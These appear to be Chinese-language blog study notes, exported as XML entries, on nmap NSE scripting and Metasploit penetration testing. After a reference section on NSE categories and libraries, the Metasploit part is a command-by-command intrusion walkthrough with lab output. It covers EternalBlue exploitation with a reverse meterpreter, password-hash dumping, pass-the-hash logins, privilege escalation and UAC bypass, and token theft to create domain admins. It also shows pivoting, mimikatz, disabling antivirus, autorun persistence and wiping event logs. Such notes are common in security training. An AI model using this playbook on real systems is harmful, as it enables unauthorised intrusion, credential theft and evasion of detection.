进行模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive 可能会引起目标系统崩溃或者对目标网络造成极大负担的脚本。这类脚本很容易被对方的防火墙或者IDS发现 malware 用来检测恶意软件的脚本 safe 在任何情况下都是安全无害的脚本 version 负责增强服务与版本扫描功能的脚本 vuln 负责检查目标机是否有常见的漏洞 2.脚本的使用调用一个脚本nmap --script smb-vuln-ms17-010.nse 192.168.1.0/24 调用一个分类nmap --script discovery 45.32.8.31 3.脚本的应用1)修改nmap默认的客户端,使用脚本判断服务器所支持的http方法。nmap --script http-methods --script-args http.useragent="Mozilla 42" 45.32.8.31 4.nse脚本规则1）Prerule()规则，这个规则的执行要早于nmap的扫描，因此这类脚本不会调用nmap扫描得到的任何结果。执行的顺序是先脚本，后nmap扫描2）Hostrule()规则，这个规则实在nmap已经完成了主机的发现之后执行的，根据主机发现的结果来触发该类脚本。执行的顺序是先nmap发现，后脚本。3）Portrule(）规则，执行了端口扫描或版本侦测时才会触发的脚本，这个规则的执行与端口的状态联系紧密。执行的顺序是先nmap端口扫描后脚本。4）Postrule(）规则，但所有的扫描都结束以后才会执行的脚本。3.一个不错nse脚本编译工具Halcyon5.将写的脚本添加到nmap中：将写好的 *.nes 文件 放在nmap安装目录的scripts文件夹中，再nmap中运行Nmap --script-updatedb 5.lua语言 nse中的apinmap中的api的核心功能就是向脚本提供关于主机和端口的信息。nmap引擎会向脚本传递乳腺连个Lua table类型的参数：host tableport table host tablehost.os 包含目标的操作系统类型 host.ip 包含了目标的ip的地址 host.nmae 包含了目标的反向dns主机名 host.targetname 包含了目标主机在命令行中的名字 host.directly_connected 目标计算机是否与我们同在一个子网 host.mac_addr 目标的mac地址，只有处于同于网段才有效 host.mac_addr_src 使用的计算机的mac地址 host.interface_mtu 网络中的MTU的值host.bin_ip 目标的ip地址 host.bin_ip_src host.times 目标的时序数据host.traceroute 只有在指定--traceroute port tableport.number 标识了目标端口的编号port.protocol 目标端口的类型udP或tcp port.service 保存了端口上运行的服务port.version 通过服务扫描发现的版本信息，需要-sV扫描 port.state 保存了端口上运行的状态 nse的库文件这些库文件实现了代码分离和重构，涵盖了几乎当前所有的流行的协议、常见的字符串处理操作，甚至包含了用来实现对用户名和密码进行破解的brute库文件。 常见的Nse库文件shortport 收集常见的端口规则信息comm 与目标机进行通信，数据交换 http 完成所有对http的相关安全检测操作 stdNSE 包含了NSE开发中各种有用的功能，涉及与定时、 并发、输出和字符串处理相关 的函数。 openSSL 用来绑定OpenSSL的借口，主要用来进行加密。target 这个库的主要目的是管理新发现目标的扫描队列creds 用来保存脚本在执行时发现的登录凭证 vluns 提供关于主机的安全漏洞方面的消息 nse中的数据文件指定数据目录的所在位置nmap --datadir D:\office\nmap-7.60\nselib\data -sC -sV 45.32.8.31 nmap选择数据文件的顺序优先级1：选项–datadir所指定的目录2：环境变量所指定的位置3：安装目录4：在编译时定义的目录 web审计数据文件1.http-fingerprints.lua这个文件时一个lua table形式保存的数据文件，在这个文件中包含了一些常见的web应用信息，包含这些用用中关键文件所在的位置2.http-sql-error.list包含一些标识错误的字符串，主要被脚本http-sql-injection所使用。3.http-web-files-extensions.lsthttp-spider库文件在对页面进行扫描的过程 中狗就会使用该文件。包含了200多个常见的web应用扩展名。4.http-devframework-fingerprints.lua检测目标web应用所使用的语言5.http-folders.txt包含了九百多个HTTP常见的目录名，被脚本http-iis-webdav-vuln所调用，检测iis5/6类型服务器上传漏洞6.vhosts-default.lst脚本http-vhosts用这个数据文件来判断目标服务器是一个虚拟机还是一个真正的web服务器7.wp-plugins.lst包含了五万多个常见的wordpress初见的名称，脚本http-wordpress-plugins 利用此文件来对采用wordpress建站的服务器进行暴力穷举攻击如果不特殊指定–srcipt-args http-wordpress-plungins.search ，此脚本只会读取前100个 DBMS-auding数据文件1.mysql-cis.audit主要根据CIA MYSQL V1.0.2 benchmark来检测mysql数据库的配置安全性。 mysql-audit脚本就是用了这个文件。2.oracle-default-accounts.lst用来验证oracle数据库的用户名。 被oracle-brute 和oracle-brute-stealth两个脚本所调用3.oracle-sids包含了常见的 oracle数据库实例名 namp脑图]]></content>
      <categories>
        <category>knowledge</category>
        <category>note</category>
      </categories>
      <tags>
        <tag>knowledge</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit续]]></title>
    <url>%2Fposts%2F9e35f352.html</url>
    <content type="text"><![CDATA[信息收集1域名、dns信息收集1)whois查询whois 域名|ip 2)nslookupnslookup 域名 2.nmap1)隐秘的tcp扫描和不ping。nmap -sS -Pn ip 2)Tcp空闲扫描window上运行metasploit，线程数最好不要超过16，UXNIX平台上不要超过128msf &gt; use auxiliary/scanner/ip/ipidseq msf auxiliary(ipidseq) &gt; show optionsmsf auxiliary(ipidseq) &gt; set rhosts 192.168.2.0/24rhosts =&gt; 192.168.2.0/24msf auxiliary(ipidseq) &gt; set threads 60threads =&gt; 60msf auxiliary(ipidseq) &gt; run 发现空闲主机192.168.2.5可用于空闲扫描，对目标机进行扫描msf auxiliary(ipidseq) &gt;nmap -PN -sI 192.168.2.5 192.168.2.8 3)msf中的db_nmap4)查看metasploit的端口扫描工具msf &gt; search portscan 3.针对性扫描1）服务器消息块协议扫描msf &gt; use auxiliary/scanner/smb/smb_version 2）搜寻配置不当的mssqlmsf &gt; use auxiliary/scanner/mssql/mssql_ping msf auxiliary(mssql_ping) &gt; set rhosts 192.168.2.0/24rhosts =&gt; 192.168.2.0/24msf auxiliary(mssql_ping) &gt; set threads 255threads =&gt; 255msf auxiliary(mssql_ping) &gt; run 3）ssh服务器扫描msf&gt;search ssh_version 4)FTP扫描msf &gt; use auxiliary/scanner/ftp/ftp_version msf auxiliary(ftp_version) &gt; set threads 255threads =&gt; 255msf auxiliary(ftp_version) &gt; set rhosts 192.168.2.0/24rhosts =&gt; 192.168.2.0/24msf auxiliary(ftp_version) &gt; run 5)简单的网络管理search snmp_login 漏洞扫描1.nexpose 2.nessus3.扫描开放的vnc空口令最新版的vnc服务器不再允许使用空口令msf &gt; use auxiliary/scanner/vnc/vnc_none_auth 4.扫描开放的x11服务器x11在新的操作系统上不再使用的msf &gt; use auxiliary/scanner/x11/open_x11 2.利用扫描结果进行自动化攻击 利用autopwn自动攻击(不建议）msf&gt;db_connect postgres:toor@127.0.0.1/msf1db_import /root/nessus.nbedb_autopwn -e -t -r -x -p 渗透攻击1.渗透攻击基础 msf中的命令msf&gt;?Core Commands============= Command Description ------- ----------- ? Help menu advanced Displays advanced options for one or more modules back Move back from the current context banner Display an awesome metasploit banner cd Change the current working directory color Toggle color connect Communicate with a host edit Edit the current module with $VISUAL or $EDITOR exit Exit the console get Gets the value of a context-specific variable getg Gets the value of a global variable grep Grep the output of another command help Help menu info Displays information about one or more modules irb Drop into irb scripting mode jobs Displays and manages jobs kill Kill a job load Load a framework plugin loadpath Searches for and loads modules from a path makerc Save commands entered since start to a file options Displays global options or for one or more modules popm Pops the latest module off the stack and makes it active previous Sets the previously loaded module as the current module pushm Pushes the active or list of modules onto the module stack quit Exit the console reload_all Reloads all modules from all defined module paths rename_job Rename a job resource Run the commands stored in a file route Route traffic through a session save Saves the active datastores search Searches module names and descriptions sessions Dump session listings and display information about sessions set Sets a context-specific variable to a value setg Sets a global variable to a value show Displays modules of a given type, or all modules sleep Do nothing for the specified number of seconds spool Write console output into a file as well the screen threads View and manipulate background threads unload Unload a framework plugin unset Unsets one or more context-specific variables unsetg Unsets one or more global variables use Selects a module by name version Show the framework and console library version numbersDatabase Backend Commands========================= Command Description ------- ----------- creds List all credentials in the database db_connect Connect to an existing database db_disconnect Disconnect from the current database instance db_export Export a file containing the contents of the database db_import Import a scan result file (filetype will be auto-detected) db_nmap Executes nmap and records the output automatically db_rebuild_cache Rebuilds the database-stored module cache db_status Show the current database status hosts List all hosts in the database loot List all loot in the database notes List all notes in the database services List all services in the database vulns List all vulnerabilities in the database workspace Switch between database workspaces 可用的渗透攻击模块msf&gt;show exploits 可用的辅助模块msf&gt;show auxiliary 可用的攻击载荷show payloads 2.永恒之蓝的利用1)metasploit没有的集成的话去下载，或者更新到最新的。ms17_010扫描模块的安装root@kali:~/Desktop# cp smb_ms17_010.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/ 漏洞利用脚本的安装把模块下载到对应的目录(kali下metasploit存放模块的目录是/usr/share/metasploit-framework/modules/)cd /usr/share/metasploit-framework/modules/exploits/windows/smb/ wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb 2)漏洞扫描nmap针对漏洞脚本的定向扫描nmap -n -p445 --script smb-vuln-ms17-010 192.168.1.0/24 --open 或者使用smb_ms17_010use auxiliary/scanner/smb/smb_ms17_010 # 调用漏洞扫描模块show option # 查看模块配置选项set RHOST 192.168.1.1-254 # 配置扫描目标set THREADS 30 #配置扫描线程run #运行脚本 3)开始攻击msf&gt; use exploit/windows/smb/ms17_010_eternalblue # 调用ms17-010永恒之蓝漏洞攻击模块msf exploit(windows/smb/ms17_010_eternalblue) &gt; show targets #查看攻击的有效对象msf exploit(windows/smb/ms17_010_eternalblue) &gt; info #查看详细信息 msf exploit(ms17_010_eternalblue) &gt; setg rhost 192.168.2.5 # 设定全局变量的攻击目标 192.168.2.5rhost =&gt; 192.168.2.5msf exploit(ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp # 调用反弹的攻击载荷payload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(ms17_010_eternalblue) &gt; set lhost 192.168.2.3 # 设定将meterpreter反弹给192.168.2.3lhost =&gt; 192.168.2.3msf exploit(ms17_010_eternalblue) &gt; show options # 查询攻击参数设置 meterpreter1.常见命令基本命令： background # 让meterpreter处于后台模式 sessions -i index # 与会话进行交互，index表示第一个session quit # 退出会话 shell # 获得控制台权限 irb # 开启ruby终端ps # 查看当前活跃进程 migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 kill pid # 杀死进程 getpid # 获取当前进程的pid sysinfo # 查看目标机系统信息，如机器名，操作系统等 shutdown # 关机 截屏meterpreter&gt;screenshot 系统运行的平台信息meterpreter&gt;sysinfo 查看进程和进程转移ps migrate pid 查看权限meterpreter &gt; getuid Server username: NT AUTHORITY\SYSTEM 获取目标机器的工作目录和得到当前系统的工作目录meterpreter &gt; getwd C:\Windows\system32meterpreter &gt; getlwd /root 上传文件到目标主机和下载目标文件meterpreter &gt; upload /root/1.txt c:\\[*] uploading : /root/1.txt -&gt; c:\[*] uploaded : /root/1.txt -&gt; c:\\1.txtmeterpreter &gt; download c:/2.txt /root [*] Downloading: c:/2.txt -&gt; /root/2.txt[*] Downloaded 5.00 B of 5.00 B (100.0%): c:/2.txt -&gt; /root/2.txt[*] download : c:/2.txt -&gt; /root/2.txt 搜索目标主机上的文件meterpreter &gt; search -h Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...Search for files.OPTIONS: -d &lt;opt&gt; The directory/drive to begin searching from. Leave empty to search all drives. (Default: ) -f &lt;opt&gt; A file pattern glob to search for. (e.g. *secret*.doc?) -h Help Banner. -r &lt;opt&gt; Recursivly search sub directories. (Default: true)meterpreter &gt; search -d c:\\ -r flase -f *.txtFound 2 results... c:\1.txt (2 bytes) c:\2.txt (5 bytes) 确定是不是虚拟机meterpreter &gt; run post/windows/gather/checkvm [*] Checking if WIN-VONVJ6OMEQ7 is a Virtual Machine .....[+] This is a VMware Virtual Machine 开3389meterpreter &gt; run post/windows/manage/enable_rdp[*] Enabling Remote Desktop[*] RDP is disabled; enabling it ...[*] Setting Terminal Services service startup mode[*] The Terminal Services service is not set to auto, changing it to auto ...[*] Opening port in local firewall if necessary[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20180430181213_default_192.168.1.187_host.windows.cle_516653.txtmeterpreter &gt; netstat -anoConnection list=============== Proto Local address Remote address State User Inode PID/Program name ----- ------------- -------------- ----- ---- ----- ---------------- tcp 0.0.0.0:135 0.0.0.0:* LISTEN 0 0 696/svchost.exe tcp 0.0.0.0:445 0.0.0.0:* LISTEN 0 0 4/System tcp 0.0.0.0:3389 0.0.0.0:* LISTEN 0 0 1040/svchost.exe 远程主机的3389的端口映射到本机的1235号端口meterpreter &gt; portfwd add -l 1234 -r 192.168.1.187 -p 3389[*] Local TCP relay created: :1234 &lt;-&gt; 192.168.1.187:3389 创建新进程cmd.exe，-H不可见，-i交互meterpreter &gt; executeUsage: execute -f file [options]Executes a command on the remote machine.OPTIONS: -H Create the process hidden from view. -a &lt;opt&gt; The arguments to pass to the command. -c Channelized I/O (required for interaction). -d &lt;opt&gt; The &apos;dummy&apos; executable to launch when using -m. -f &lt;opt&gt; The executable command to run. -h Help menu. -i Interact with the process after creating it. -k Execute process on the meterpreters current desktop -m Execute from memory. -s &lt;opt&gt; Execute process in a given session as the session user -t Execute process with currently impersonated thread tokenmeterpreter &gt; excte -H -f cmd.exe[-] Unknown command: excte.meterpreter &gt; execute -H -f cmd.exeProcess 1840 created. 2.获取密码哈希值aad3b435开头的哈希值是一个空的或者不存在的哈希值–空字符串的占位符meterpreter &gt; use priv[-] The &apos;priv&apos; extension has already been loaded.meterpreter &gt; run post/windows/gather/hashdump[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...No users with password hints on this system[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 3.用得到的管理员的用户哈希值登录msf &gt; use exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; show optionsModule options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes The SMB service port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate asExploit target: Id Name -- ---- 0 Automaticmsf exploit(windows/smb/psexec) &gt; set rhost 192.168.1.187rhost =&gt; 192.168.1.187msf exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(windows/smb/psexec) &gt; set lhost 192.168.1.130lhost =&gt; 192.168.1.130msf exploit(windows/smb/psexec) &gt; set lpost 4333lpost =&gt; 4333msf exploit(windows/smb/psexec) &gt; set SMBPass aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020SMBPass =&gt; aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020msf exploit(windows/smb/psexec) &gt; set SMBUser AdministratorSMBUser =&gt; Administratormsf exploit(windows/smb/psexec) &gt; exploit[*] Started reverse TCP handler on 192.168.1.230:1444 [*] 192.168.1.187:445 - Connecting to the server...[*] 192.168.1.187:445 - Authenticating to 192.168.1.187:445 as user &apos;Administrator&apos;...[*] 192.168.1.187:445 - Selecting PowerShell target[*] 192.168.1.187:445 - Executing the payload...[+] 192.168.1.187:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (205891 bytes) to 192.168.1.187[*] Meterpreter session 1 opened (192.168.1.230:1444 -&gt; 192.168.1.187:49468) at 2018-04-30 18:48:56 -0400meterpreter &gt; 4.权限提升meterpreter &gt; use priv[-] The &apos;priv&apos; extension has already been loaded.meterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM bypassuac meterpreter &gt; background[*] Backgrounding session 1...msf exploit(windows/smb/psexec) &gt; use exploit/windows/local/bypassuacmsf exploit(windows/local/bypassuac) &gt; set session 1session =&gt; 1msf exploit(windows/local/bypassuac) &gt; exploit 5.令牌的假冒1）incognitometerpreter &gt; use incognito Loading extension incognito...Success.meterpreter &gt; list_tokens -u Delegation Tokens Available========================================NT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEMWIN-VONVJ6OMEQ7\AdministratorImpersonation Tokens Available========================================NT AUTHORITY\ANONYMOUS LOGON 2)ps 找到域管理员的pid参数(有时候不能看到）meterpreter&gt;ps meterpreter &gt; steal_token pid号 #盗取域管理员用户的令牌 利用域管理员的令牌创建用户，并授予域管理员的权限例子meterpreter&gt;impresonate_token SNEAKS.IN\\domianadminmeterpreter&gt;add_user qy qy -h 192.168.1.5 #-h是域管理员添加账号的地址meterpreter&gt;add_group_user &quot;Doamin Admins&quot; qy -h 192.168.1.5 6.通过跳板攻击其他主机meterpreter &gt; run get_local_subnets #查看本地子网[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Local subnet: 192.168.1.0/255.255.255.0meterpreter &gt; background[*] Backgrounding session 1...msf exploit(windows/local/bypassuac) &gt; route add 192.168.2.0 255.255.255.0 1 #告诉系统将远程ID通过攻击会话1来进行路由[*] Route addedmsf exploit(windows/local/bypassuac) &gt; route print #显示当前活跃的路由信息IPv4 Active Routing Table========================= Subnet Netmask Gateway ------ ------- ------- 192.168.2.0 255.255.255.0 Session 1 7.获取系统管理员的密码meterpreter &gt; load mimikatzLoading extension mimikatz...Success.meterpreter &gt; wdigest[+] Running as SYSTEM[*] Retrieving wdigest credentialswdigest credentials===================AuthID Package Domain User Password------ ------- ------ ---- --------0;996 Negotiate WORKGROUP WIN-VONVJ6OMEQ7$ 0;46406 NTLM 0;997 Negotiate NT AUTHORITY LOCAL SERVICE 0;999 NTLM WORKGROUP WIN-VONVJ6OMEQ7$ 8.脚本的使用1).vncmeterpreter &gt; run vnc #在远程系统上安装vnc会话[*] Creating a VNC reverse tcp stager: LHOST=192.168.1.230 LPORT=4545[*] Running payload handler[*] VNC stager executable 73802 bytes long[*] Uploaded the VNC agent to C:\Windows\TEMP\jzoEGmzImp.exe (must be deleted manually)[*] Executing the VNC agent with endpoint 192.168.1.230:4545...meterpreter &gt; run screen_unlock # 对目标机器上的桌面进行解锁[!] Meterpreter scripts are deprecated. Try post/windows/escalate/screen_unlock.[!] Example: run post/windows/escalate/screen_unlock OPTION=value [...][*] no working target found 2).查看系统安装的软件meterpreter &gt; run post/windows/gather/enum_applications[*] Enumerating applications installed on WIN-VONVJ6OMEQ7Installed Applications====================== Name Version ---- ------- 2345好压 v5.9 Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161 9.0.30729.6161 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161 9.0.30729.6161 Microsoft Visual C++ 2015 Redistributable (x64) - 14.0.24215 14.0.24215.1 Microsoft Visual C++ 2015 x64 Additional Runtime - 14.0.24215 14.0.24215 Microsoft Visual C++ 2015 x64 Minimum Runtime - 14.0.24215 14.0.24215 Python 2.7.13 (64-bit) 2.7.13150 VMware Tools 10.2.0.7259539[+] Results stored in: /root/.msf4/loot/20180501054603_default_192.168.1.187_host.application_930049.txt 3)迁移到稳定的进程meterpreter &gt; getpidCurrent pid: 1128meterpreter &gt; run post/windows/manage/migrate[*] Running module against WIN-VONVJ6OMEQ7[*] Current server process: spoolsv.exe (1128)[*] Spawning notepad.exe process to migrate to[+] Migrating to 3592[+] Successfully migrated to process 3592meterpreter &gt; getpidCurrent pid: 3592 4)关闭杀毒软件meterpreter &gt; run killav[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.[!] Example: run post/windows/manage/killav OPTION=value [...][*] Killing Antivirus services on the target... 5)查看目标机上的所有来流量meterpreter &gt; run packetrecorder -i 1[!] Meterpreter scripts are deprecated. Try post/windows/manage/rpcapd_start.[!] Example: run post/windows/manage/rpcapd_start OPTION=value [...][*] Starting Packet capture on interface 1[+] Packet capture started[*] Packets being saved in to /root/.msf4/logs/scripts/packetrecorder/WIN-VONVJ6OMEQ7_20180501.0138/WIN-VONVJ6OMEQ7_20180501.0138.cap[*] Packet capture interval is 30 Seconds 5)得到目标主机系统用户的哈希值meterpreter &gt; run hashdump[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...][*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...No users with password hints on this system[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 6)得到详细的系统信息用户名和密码、下载全部注册表、挖掘密码哈希值和收集系统信息meterpreter &gt; run scraper[*] New session on 192.168.1.187:445...[*] Gathering basic system information...[*] Dumping password hashes...[*] Obtaining the entire registry...[*] Exporting HKCU[*] Downloading HKCU (C:\Windows\TEMP\JKaHEoEs.reg)[*] Cleaning HKCU[*] Exporting HKLM[*] Downloading HKLM (C:\Windows\TEMP\qCMsnidu.reg)[*] Cleaning HKLM[*] Exporting HKCC[*] Downloading HKCC (C:\Windows\TEMP\PTbboPFX.reg)[*] Cleaning HKCC[*] Exporting HKCR[*] Downloading HKCR (C:\Windows\TEMP\AQMWnvZo.reg)[*] Cleaning HKCR[*] Exporting HKU[*] Downloading HKU (C:\Windows\TEMP\XNLnHUgE.reg)[*] Cleaning HKU[*] Completed processing on 192.168.1.187:445... 7）控制持久化-X 开机自启动，-i 40每40秒重连一次 -p指定端口meterpreter &gt; run persistence -X -i 40 -p 443 -r 192.168.1.187 [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Running Persistence Script[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-VONVJ6OMEQ7_20180501.2631/WIN-VONVJ6OMEQ7_20180501.2631.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=443[*] Persistent agent script is 99671 bytes long[+] Persistent Script written to C:\Windows\TEMP\ManzZNr.vbs[*] Executing script C:\Windows\TEMP\ManzZNr.vbs[+] Agent executed with PID 3852[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\KHNDPfTiTa[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\KHNDPfTiTa 开始连接msf &gt; use multi/handlermsf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 192.168.1.187lhost =&gt; 192.168.1.187msf exploit(multi/handler) &gt; set lport 443lport =&gt; 443msf exploit(multi/handler) &gt; exploit 8）列出所有后渗透模块run post/ 后，按tab见meterpreter &gt; run post/Display all 207 possibilities? (y or n) 9.Railgun组件操作windows APImeterpreter &gt; irb[*] Starting IRB shell[*] The &quot;client&quot; variable holds the meterpreter client&gt;&gt; client.railgun.user32.MessageBoxA(0,&quot;hello&quot;,&quot;world&quot;,&quot;MB_OK&quot;) 结果如下图10.将shell提升为meterpreterC:\Windows\system32&gt; # ctrl+z 把会话放在后台 Background session 1? [y/N] ymsf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -iActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Windows\s... 192.168.1.230:4411 -&gt; 192.168.1.187:54038 (192.168.1.187)msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -u 1 #升级为meterpreter 11.隐藏踪迹清除了所有日志，容易被发现。meterpreter &gt; run event_managerMeterpreter Script for Windows Event Log Query and Clear.OPTIONS: -c &lt;opt&gt; Clear a given Event Log (or ALL if no argument specified) -f &lt;opt&gt; Event ID to filter events on -h Help menu -i Show information about Event Logs on the System and their configuration -l &lt;opt&gt; List a given Event Log. -p Supress printing filtered logs to screen -s &lt;opt&gt; Save logs to local CSV file, optionally specify alternate folder in which to save logsmeterpreter &gt; run event_manager -c[-] You must specify and eventlog to query![*] Application: [*] Clearing Application[*] Event Log Application Cleared![*] HardwareEvents: [*] Clearing HardwareEvents[*] Event Log HardwareEvents Cleared![*] Internet Explorer: [*] Clearing Internet Explorer[*] Event Log Internet Explorer Cleared![*] Key Management Service: [*] Clearing Key Management Service[*] Event Log Key Management Service Cleared![*] Security: [*] Clearing Security[*] Event Log Security Cleared![*] System: [*] Clearing System[*] Event Log System Cleared![*] ThinPrint Diagnostics: [*] Clearing ThinPrint Diagnostics[*] Event Log ThinPrint Diagnostics Cleared![*] Windows PowerShell: [*] Clearing Windows PowerShell[*] Event Log Windows PowerShell Cleared! msfvenommsfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）已然成为历史，取而代之的是msfvenom1.常识参数含义：root@kali:~# msfvenom -hMsfVenom - a Metasploit standalone payload generator.Also a replacement for msfpayload and msfencode.Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;Options: -p, --payload &lt;payload&gt; Payload to use. Specify a &apos;-&apos; or stdin to use custom payloads --payload-options List the payload&apos;s standard options -l, --list [type] List a module type. Options are: payloads, encoders, nops, all -n, --nopsled &lt;length&gt; Prepend a nopsled of [length] size on to the payload -f, --format &lt;format&gt; Output format (use --help-formats for a list) --help-formats List available formats -e, --encoder &lt;encoder&gt; The encoder to use -a, --arch &lt;arch&gt; The architecture to use --platform &lt;platform&gt; The platform of the payload --help-platforms List available platforms -s, --space &lt;length&gt; The maximum size of the resulting payload --encoder-space &lt;length&gt; The maximum size of the encoded payload (defaults to the -s value) -b, --bad-chars &lt;list&gt; The list of characters to avoid example: &apos;\x00\xff&apos; -i, --iterations &lt;count&gt; The number of times to encode the payload -c, --add-code &lt;path&gt; Specify an additional win32 shellcode file to include -x, --template &lt;path&gt; Specify a custom executable file to use as a template -k, --keep Preserve the template behavior and inject the payload as a new thread -o, --out &lt;path&gt; Save the payload -v, --var-name &lt;name&gt; Specify a custom variable name to use for certain output formats --smallest Generate the smallest possible payload -h, --help Show this message 1)查看payloadroot@kali:~# msfvenom -l payloadsFramework Payloads (507 total)============================== Name Description ---- ----------- aix/ppc/shell_bind_tcp Listen for a connection and spawn a command shell aix/ppc/shell_find_port Spawn a shell on an established connection aix/ppc/shell_interact Simply execve /bin/sh (for inetd programs) aix/ppc/shell_reverse_tcp Connect back to attacker and spawn a command shell android/meterpreter/reverse_http Run a meterpreter server in Android. Tunnel communication over HTTP android/meterpreter/reverse_https Run a meterpreter server in Android. Tunnel communication over HTTPS android/meterpreter/reverse_tcp Run a meterpreter server in Android. Connect back stager …… 2)查看编码方法root@kali:~# msfvenom -l encodersFramework Encoders================== Name Rank Description ---- ---- ----------- cmd/echo good Echo Command Encoder cmd/generic_sh manual Generic Shell Variable Substitution Command Encoder cmd/ifs low Generic $&#123;IFS&#125; Substitution Command Encoder cmd/perl normal Perl Command Encoder cmd/powershell_base64 excellent Powershell Base64 Command Encoder cmd/printf_php_mq manual printf(1) via PHP magic_quotes Utility Command Encoder generic/eicar manual The EICAR Encoder generic/none normal The &quot;none&quot; Encoder mipsbe/byte_xori normal Byte XORi Encoder mipsbe/longxor normal XOR Encoder mipsle/byte_xori normal Byte XORi Encoder mipsle/longxor normal XOR Encoder php/base64 great PHP Base64 Encoder ppc/longxor normal PPC LongXOR Encoder ppc/longxor_tag normal PPC LongXOR Encoder sparc/longxor_tag normal SPARC DWORD XOR Encoder x64/xor normal XOR Encoder x64/zutto_dekiru manual Zutto Dekiru x86/add_sub manual Add/Sub Encoder x86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder x86/alpha_upper low Alpha2 Alphanumeric Uppercase Encoder x86/avoid_underscore_tolower manual Avoid underscore/tolower x86/avoid_utf8_tolower manual Avoid UTF8/tolower x86/bloxor manual BloXor - A Metamorphic Block Based XOR Encoder x86/bmp_polyglot manual BMP Polyglot x86/call4_dword_xor normal Call+4 Dword XOR Encoder x86/context_cpuid manual CPUID-based Context Keyed Payload Encoder x86/context_stat manual stat(2)-based Context Keyed Payload Encoder x86/context_time manual time(2)-based Context Keyed Payload Encoder x86/countdown normal Single-byte XOR Countdown Encoder x86/fnstenv_mov normal Variable-length Fnstenv/mov Dword XOR Encoder x86/jmp_call_additive normal Jump/Call XOR Additive Feedback Encoder x86/nonalpha low Non-Alpha Encoder x86/nonupper low Non-Upper Encoder x86/opt_sub manual Sub Encoder (optimised) x86/service manual Register Service x86/shikata_ga_nai excellent Polymorphic XOR Additive Feedback Encoder x86/single_static_bit manual Single Static Bit x86/unicode_mixed manual Alpha2 Alphanumeric Unicode Mixedcase Encoder x86/unicode_upper manual Alpha2 Alphanumeric Unicode Uppercase Encoder exclent级别cmd/powershell_base64 x86/shikata_ga_nai 3)查看nops选项（空字段模块，为了绕过和免杀）root@kali:~# msfvenom -l nopsFramework NOPs (10 total)========================= Name Description ---- ----------- aarch64/simple Simple NOP generator armle/simple Simple NOP generator mipsbe/better Better NOP generator php/generic Generates harmless padding for PHP scripts ppc/simple Simple NOP generator sparc/random SPARC NOP generator tty/generic Generates harmless padding for TTY input x64/simple An x64 single/multi byte NOP instruction generator. x86/opty2 Opty2 multi-byte NOP generator x86/single_byte Single-byte NOP generator 4)可支持的平台root@kali:~# msfvenom --help-platformsPlatforms aix, android, apple_ios, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, 